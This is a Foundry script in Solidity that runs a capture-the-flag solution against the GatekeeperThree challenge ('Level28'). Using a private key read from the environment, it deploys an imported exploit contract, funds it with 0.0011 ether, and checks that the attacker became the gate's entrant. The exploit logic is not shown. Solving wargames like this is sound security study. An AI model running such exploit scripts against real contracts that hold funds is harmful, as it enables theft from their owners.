pragma solidity ^0.8.14;

import {Script, console} from "forge-std/Script.sol";
import {VmSafe} from "forge-std/Vm.sol";
import {GatekeeperThree, SimpleTrick} from "../src/Level28.sol";
import {GatekeeperThreeExploit} from "../src/Level28Exploit.sol";

contract Level28Script is Script {
    function run() public {
        VmSafe.Wallet memory wallet = vm.createWallet(vm.envUint("PRIVATE_KEY"));
        address payable contractAddress = payable(vm.envAddress("CONTRACT"));

        vm.startBroadcast(wallet.privateKey);
        exploit(contractAddress);
        vm.stopBroadcast();

        require(levelDone(contractAddress, wallet.addr), "Solution failed");
    }

    function exploit(address _target) private {
        GatekeeperThreeExploit e = new GatekeeperThreeExploit();
        e.exploit{value: 0.0011 ether}(payable(_target));
    }

    function levelDone(address _target, address _attacker) private returns (bool) {
        return GatekeeperThree(payable(_target)).entrant() == _attacker;
    }
}
